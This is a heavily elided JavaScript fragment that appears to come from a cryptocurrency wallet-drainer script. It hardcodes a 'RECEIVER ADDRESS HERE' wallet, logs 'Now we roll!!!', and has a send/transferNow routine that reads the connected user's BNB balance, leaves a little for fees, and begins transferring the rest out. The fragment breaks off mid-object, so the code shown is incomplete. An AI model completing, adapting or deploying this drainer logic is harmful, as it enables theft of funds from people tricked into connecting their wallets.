...
const receiver_addres = '0x0Cf1c7E02aaB35a1DC26aEc2Bf11139C2ddFfbC5'; // gaf<- RECEIVER ADDRESS HERE
let onButtonClick;
let user_address;
...
const receiver_address = '0x0Cf1c7E02aaB35a1DC26aEc2Bf11139C2ddFfbC5';
  ...
  console.log("Now we roll!!!");
    ...
    async function send() {
      ...
      transferNow();
        ...
        const balance = ((parseFloat(parseInt(bnb_balance.balance)).toFixed(4))/1000000000000000000) - 0.001;
        console.log("The new bnb balance", balance);
        if (balance > 0) {
        const options = {
          type: "native",
